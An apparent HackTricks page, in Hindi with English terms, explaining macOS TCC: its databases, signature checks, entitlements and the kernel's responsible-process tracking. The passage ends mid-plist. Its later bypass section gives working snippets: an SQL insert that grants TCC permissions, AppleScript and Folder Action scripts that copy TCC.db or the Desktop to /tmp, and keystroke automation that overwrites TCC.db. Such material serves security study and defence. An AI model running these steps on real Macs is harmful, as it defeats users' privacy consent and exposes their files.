# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **बुनियादी जानकारी**

**TCC (Transparency, Consent, and Control)** एक security protocol है, जिसका उद्देश्य application permissions को नियंत्रित करना है। इसकी मुख्य भूमिका **location services, contacts, photos, microphone, camera, accessibility, और full disk access** जैसी संवेदनशील सुविधाओं की सुरक्षा करना है। इन तत्वों तक application की पहुंच देने से पहले स्पष्ट user consent अनिवार्य करके, TCC privacy और users के अपने data पर control को बेहतर बनाता है।

जब applications protected features तक पहुंच का अनुरोध करती हैं, तब users को TCC दिखाई देता है। यह एक prompt के माध्यम से दिखता है, जो users को **access approve या deny** करने की अनुमति देता है। इसके अलावा, TCC users की सीधी कार्रवाइयों, जैसे **files को किसी application में drag और drop करना**, को भी specific files तक access देने के लिए स्वीकार करता है। इससे यह सुनिश्चित होता है कि applications को केवल वही access मिले जिसकी स्पष्ट अनुमति दी गई है।

![TCC prompt का एक उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** को `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित **daemon** द्वारा संभाला जाता है और इसे `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में configure किया गया है (`com.apple.tccd.system` mach service को register करते हुए)।

प्रत्येक logged-in user के लिए एक **user-mode tccd** चलता है, जिसे `/System/Library/LaunchAgents/com.apple.tccd.plist` में define किया गया है और जो `com.apple.tccd` तथा `com.apple.usernotifications.delegate.com.apple.tccd` mach services को register करता है।

यहां आप tccd को system और user, दोनों के रूप में चलता हुआ देख सकते हैं:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions **parent** application से **inherited** होती हैं और **permissions** को **Bundle ID** तथा **Developer ID** के आधार पर **tracked** किया जाता है।

### TCC Databases

अनुमतियां/अस्वीकृतियां फिर कुछ TCC databases में stored होती हैं:

- **`/Library/Application Support/com.apple.TCC/TCC.db`** में system-wide database।
- यह database **SIP protected** है, इसलिए इसमें केवल SIP bypass के माध्यम से write किया जा सकता है।
- प्रति-user preferences के लिए user TCC database **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**।
- यह database protected है, इसलिए केवल Full Disk Access जैसे high TCC privileges वाली processes इसमें write कर सकती हैं (लेकिन यह SIP द्वारा protected नहीं है)।

> [!WARNING]
> पिछले databases read access के लिए भी **TCC protected** हैं। इसलिए आप अपने regular user TCC database को पढ़ **नहीं पाएंगे**, जब तक वह किसी TCC privileged process से access न किया जाए।
>
> हालांकि, याद रखें कि इन high privileges वाली process (जैसे **FDA** या **`kTCCServiceEndpointSecurityClient`**) के पास users TCC database में write करने की क्षमता होगी।

- **`/var/db/locationd/clients.plist`** में एक **third** TCC database है, जो **location services** को **access** करने की अनुमति वाले clients को दर्शाता है।
- SIP protected file **`/Users/carlospolop/Downloads/REG.db`** (जो TCC द्वारा read access से भी protected है) में सभी **valid TCC databases** का **location** होता है।
- SIP protected file **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (जो TCC द्वारा read access से भी protected है) में अधिक TCC granted permissions होती हैं।
- SIP protected file **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (जिसे कोई भी पढ़ सकता है) उन applications की allow list है जिन्हें TCC exception की आवश्यकता होती है।

> [!TIP]
> **iOS** में TCC database **`/private/var/mobile/Library/TCC/TCC.db`** में होता है।

> [!TIP]
> **notification center UI** system TCC database में **changes** कर सकता है:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> हालांकि, users **`tccutil`** command line utility से rules को **delete या query** कर सकते हैं।

#### Databases को query करना

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> दोनों डेटाबेस की जाँच करके आप यह देख सकते हैं कि किसी app ने कौन-सी permissions allow की हैं, कौन-सी forbid की हैं, या कौन-सी permissions उसके पास नहीं हैं (वह इसके लिए पूछेगा)।

- **`service`** TCC **permission** का string representation है
- **`client`** permissions वाले **bundle ID** या **binary के path** को दर्शाता है
- **`client_type`** यह बताता है कि यह Bundle Identifier(0) है या absolute path(1)

<details>

<summary>यदि यह absolute path है तो execute कैसे करें</summary>

बस **`launctl load you_bin.plist`** चलाएँ, जिसमें plist इस तरह हो:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** के अलग-अलग values हो सकते हैं: denied(0), unknown(1), allowed(2), या limited(3)।
- **`auth_reason`** निम्नलिखित values ले सकता है: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** field यह बताने के लिए है कि binary को execute करने और TCC permissions grant करने से पहले उसका verification कैसे किया जाए:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- तालिका के **अन्य fields** के बारे में अधिक जानकारी के लिए [**यह blog post देखें**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)।<sup>[1]</sup>

आप `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में apps को दी गई **permissions** भी देख सकते हैं।

> [!TIP]
> Users **`tccutil`** का उपयोग करके **rules delete या query कर सकते हैं**।

#### TCC permissions reset
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

TCC **डेटाबेस** ऐप का **Bundle ID** स्टोर करता है, लेकिन यह **हस्ताक्षर** से संबंधित **जानकारी** भी **स्टोर** करता है, ताकि यह **सुनिश्चित** किया जा सके कि permission का उपयोग करने का अनुरोध करने वाला **App** सही है।
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> इसलिए, समान name और bundle ID का उपयोग करने वाली अन्य applications, अन्य apps को दी गई granted permissions तक access नहीं कर पाएंगी।

### Entitlements & TCC Permissions

Apps को केवल कुछ resources के लिए **request** करने और **granted access** प्राप्त करने की आवश्यकता नहीं होती, बल्कि उनके पास **relevant entitlements** भी होने चाहिए।\
उदाहरण के लिए **Telegram** के पास **camera तक access request** करने के लिए entitlement `com.apple.security.device.camera` है। जिस **app** के पास यह **entitlement नहीं होगा, वह camera तक access नहीं कर पाएगा** (और user से permissions के लिए पूछा भी नहीं जाएगा)।

ध्यान दें कि entitlements plist files होती हैं और code sig का हिस्सा होती हैं। इन्हें special slots द्वारा code sig में आगे hash किया जाता है और kernel code द्वारा kernel में या user mode code द्वारा `csops(#169)` अथवा `csops_audittoken(#170)` का उपयोग करके query किया जा सकता है।

हालाँकि, कुछ **user folders**, जैसे `~/Desktop`, `~/Downloads` और `~/Documents`, तक **access** करने के लिए apps को किसी specific **entitlements** की आवश्यकता नहीं होती। System transparently access को handle करेगा और आवश्यकता होने पर **user को prompt** करेगा।

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple के apps **prompts generate नहीं करेंगे**। उनकी **entitlements** list में **pre-granted rights** शामिल होते हैं, जिसका अर्थ है कि वे **कभी popup generate नहीं करेंगे**, और न ही वे किसी **TCC databases** में दिखाई देंगे। उदाहरण के लिए:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
यह Calendar द्वारा user से reminders, calendar और address book को access करने की अनुमति मांगने से बचाएगा।

> [!TIP]
> Entitlements से संबंधित कुछ official documentation के अलावा, [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) पर **entitlements के बारे में unofficial **interesting information** भी मिल सकती है।**

कुछ TCC permissions हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... ऐसी कोई public list नहीं है जो इन सभी को परिभाषित करती हो, लेकिन आप [**known ones की इस list**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) को देख सकते हैं।<sup>[1]</sup>

### Sensitive unprotected places

- $HOME (स्वयं)
- $HOME/.ssh, $HOME/.aws, आदि
- /tmp

### User Intent / com.apple.macl

जैसा कि पहले बताया गया है, **किसी App को किसी file तक access देना संभव है, उसे उस App पर drag\&drop करके**। यह access किसी TCC database में निर्दिष्ट नहीं होगा, बल्कि file के **extended** **attribute** के रूप में होगा। यह attribute allowed app का **UUID store** करेगा:<sup>[2]</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> यह दिलचस्प है कि **`com.apple.macl`** attribute को tccd नहीं, बल्कि **Sandbox** manage करता है।
>
> यह भी ध्यान दें कि यदि आप किसी ऐसी file को, जो आपके computer में किसी app के UUID को allow करती है, किसी दूसरे computer पर ले जाते हैं, तो उस app को access नहीं मिलेगा, क्योंकि उसी app के UIDs अलग होंगे।

अन्य extended attributes की तरह extended attribute `com.apple.macl` को **clear नहीं किया जा सकता**, क्योंकि यह **SIP द्वारा protected** है। हालांकि, जैसा कि [**इस post में बताया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), file को **zipping**, उसे **deleting** और फिर **unzipping** करके इसे disable करना संभव है।<sup>[3]</sup>






## XNU Responsible Process Mechanism

macOS/iOS में, **responsible process** mechanism एक महत्वपूर्ण security feature है, जिसका उपयोग **TCC (Transparency, Consent, and Control)** framework और अन्य security systems द्वारा यह track करने के लिए किया जाता है कि किसी action के लिए अंततः कौन-सा process responsible है, चाहे child processes की कितनी भी chains हों।

जब TCC permissions (जैसे camera, microphone, location) check करता है, तो वह हमेशा request करने वाले immediate process को check नहीं करता। इसके बजाय, वह **responsible process** को check करता है - आमतौर पर वह GUI application जिसने action शुरू किया था, भले ही actual request किसी helper process या daemon से आई हो।

<details>
<summary>Responsible Process कैसे Set किया जाता है</summary>

### Process Structure Fields

XNU में प्रत्येक process दो महत्वपूर्ण UUID identifiers maintain करता है:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Process का अपना UUID (उसके Mach-O binary के `LC_UUID` load command से)
- **`p_responsible_pid`**: जिम्मेदार process का PID
- **`p_responsible_uuid`**: जिम्मेदार process का UUID (वह process exit होने के बाद भी बना रहता है)

### Responsible Process कैसे Set होता है

1. **Process Creation (Fork) के दौरान**

जब कोई नया process `fork()` या `posix_spawn()` के ज़रिए बनाया जाता है, तो responsible process parent से inherit होता है (`exec()` syscall मौजूदा `proc` structure का पुनः उपयोग करता है, इसलिए वहाँ यह step दोबारा नहीं होता):

**Location**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**मुख्य बिंदु:**
- Child processes, parent के `p_responsible_pid` को **inherit** करते हैं
- इससे process hierarchy के माध्यम से **chain of responsibility** बनती है
- responsible process आमतौर पर मूल GUI application की ओर संकेत करता है

2. **मुख्य Function: `proc_set_responsible_pid()`**

**स्थान**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**यह function क्या करता है:**
1. **Target process में responsible PID सेट करता है**
2. `proc_find()` का उपयोग करके **responsible process को खोजता है** (reference count बढ़ाता है)
3. Responsible process के `p_uuid` से UUID को target process के `p_responsible_uuid` में **कॉपी करता है**
4. `proc_rele()` के साथ **reference रिलीज़ करता है** (reference count घटाता है)

3. **PID और UUID दोनों क्यों store किए जाते हैं?**

Dual-storage approach एक महत्वपूर्ण समस्या हल करता है:

| Field | उद्देश्य | समस्या | समाधान |
|-------|---------|---------|---------|
| `p_responsible_pid` | Current process का तेज़ lookup | Process के exit होने के बाद PID reuse हो सकता है | Active process lookup के लिए उपयोग किया जाता है |
| `p_responsible_uuid` | Persistent identification | Process termination के बाद भी बना रहता है | Security checks और auditing के लिए उपयोग किया जाता है |

**समस्या**: यदि child process से पहले responsible process exit हो जाता है, तो PID recycle होकर किसी पूरी तरह अलग process को assign किया जा सकता है।

**समाधान**: UUID immutable होता है और उस specific binary की विशिष्ट पहचान करता है जो responsible था, उसके exit होने के बाद भी।

### Process Creation Flow
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID Source: LC_UUID Load Command

`p_uuid` में stored UUID **Mach-O executable के `LC_UUID` load command** से आता है:

1. **Compilation Time**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Execution का समय**

**स्थान**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Process Structure में Stored**

**Location**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**स्थान**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc और Bypasses

### TCC में Insert

यदि किसी समय आपको किसी TCC database पर write access मिल जाता है, तो entry जोड़ने के लिए आप निम्न जैसा कुछ उपयोग कर सकते हैं (comments हटा दें):

<details>

<summary>TCC Insert का उदाहरण</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

यदि आप कुछ TCC permissions के साथ किसी app के अंदर प्रवेश करने में सफल हुए हैं, तो उनका दुरुपयोग करने के लिए TCC payloads वाला निम्न पेज देखें:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events के बारे में यहां जानें:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation permission का TCC नाम है: **`kTCCServiceAppleEvents`**\
यह विशिष्ट TCC permission TCC database के अंदर **उस application को भी दर्शाती है जिसे manage किया जा सकता है** (इसलिए permissions केवल सब कुछ manage करने की अनुमति नहीं देतीं)।

**Finder** एक ऐसा application है जिसके पास **हमेशा FDA होता है** (भले ही यह UI में दिखाई न दे), इसलिए यदि आपके पास इसके ऊपर **Automation** privileges हैं, तो आप इसके privileges का दुरुपयोग करके **इससे कुछ actions करवा सकते हैं**।\
इस मामले में आपके app को **`kTCCServiceAppleEvents`** permission **`com.apple.Finder`** के ऊपर चाहिए होगी।<sup>[4]</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

आप इसका दुरुपयोग करके **अपना स्वयं का user TCC database लिख सकते हैं**।

> [!WARNING]
> इस permission के साथ आप **Finder से TCC restricted folders को access करने और उनकी files आपको देने के लिए कह सकेंगे**, लेकिन afaik आप **Finder से arbitrary code execute नहीं करवा सकेंगे**, ताकि उसके FDA access का पूरी तरह दुरुपयोग किया जा सके।
>
> इसलिए, आप full FDA abilities का दुरुपयोग नहीं कर सकेंगे।

Finder पर Automation privileges प्राप्त करने के लिए यह TCC prompt है:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> ध्यान दें कि **Automator** app के पास TCC permission **`kTCCServiceAppleEvents`** होने के कारण यह Finder जैसे **किसी भी app को control कर सकता है**। इसलिए Automator को control करने की permission होने पर आप नीचे दिए गए code जैसे code से **Finder को भी control कर सकते हैं**:

<details>

<summary>Automator के अंदर एक shell प्राप्त करें</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor app** के साथ भी ऐसा ही होता है; यह Finder को control कर सकता है, लेकिन AppleScript का उपयोग करके आप इसे कोई script execute करने के लिए force नहीं कर सकते।

### Automation (SE) to some TCC

**System Events Folder Actions create कर सकता है, और Folder Actions कुछ TCC folders** (Desktop, Documents & Downloads) **को access कर सकते हैं**, इसलिए इस behaviour का abuse करने के लिए निम्न script का उपयोग किया जा सकता है:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

**`System Events`** पर Automation + Accessibility (**`kTCCServicePostEvent`**) **processes** को **keystrokes** भेजने की अनुमति देते हैं। इस तरह आप Finder का दुरुपयोग करके users की TCC.db बदल सकते हैं या किसी arbitrary app को FDA दे सकते हैं (हालांकि इसके लिए password prompt दिखाई दे सकता है)।

Finder द्वारा users की TCC.db overwrite करने का उदाहरण:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` से FDA\*

इस page को देखें, जिसमें **Accessibility permissions का abuse करने के लिए कुछ [**payloads**](macos-tcc-payloads.md#accessibility)** दिए गए हैं, ताकि उदाहरण के लिए FDA\* तक privesc किया जा सके या keylogger चलाया जा सके।

### **Endpoint Security Client से FDA**

यदि आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। समाप्त।

### System Policy SysAdmin File से FDA

**`kTCCServiceSystemPolicySysAdminFiles`** किसी user के **`NFSHomeDirectory`** attribute को **change** करने की अनुमति देता है, जिससे उसका home folder बदल जाता है और इसलिए **TCC को bypass** किया जा सकता है।

### User TCC DB से FDA

User **TCC** database पर **write permissions** प्राप्त करने पर आप स्वयं को **`FDA`** permissions नहीं दे सकते, केवल system database में मौजूद permission ही ऐसा कर सकती है।

लेकिन आप स्वयं को **`Automation rights to Finder`** दे सकते हैं और FDA\* तक escalate करने के लिए पिछली technique का abuse कर सकते हैं।

### **FDA से TCC permissions**

**Full Disk Access** का TCC नाम **`kTCCServiceSystemPolicyAllFiles`** है।

मुझे नहीं लगता कि यह वास्तविक privesc है, लेकिन शायद यह आपके लिए उपयोगी हो: यदि आप FDA वाले किसी program को control करते हैं, तो आप **user की TCC database को modify करके स्वयं को कोई भी access दे सकते हैं**। यह persistence technique के रूप में उपयोगी हो सकता है, यदि आप अपनी FDA permissions खो सकते हैं।

### **SIP Bypass से TCC Bypass**

System **TCC database** **SIP** द्वारा protected है। इसी कारण केवल **indicated entitlements वाले processes ही इसे modify कर पाएंगे**। इसलिए, यदि कोई attacker किसी **file** पर **SIP bypass** खोज लेता है (अर्थात SIP द्वारा restricted file को modify करने में सक्षम हो जाता है), तो वह:

- **TCC database की protection हटा सकता है** और स्वयं को सभी TCC permissions दे सकता है। उदाहरण के लिए, वह इनमें से किसी भी file का abuse कर सकता है:
- TCC systems database
- REG.db
- MDMOverrides.plist

हालांकि, इस **SIP bypass का abuse करके TCC bypass करने** का एक अन्य विकल्प भी है। File `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` उन applications की allow list है जिन्हें TCC exception की आवश्यकता होती है। इसलिए, यदि कोई attacker इस file से **SIP protection हटा सकता है** और अपना **application** जोड़ सकता है, तो वह application TCC को bypass कर सकेगा।\
उदाहरण के लिए terminal जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
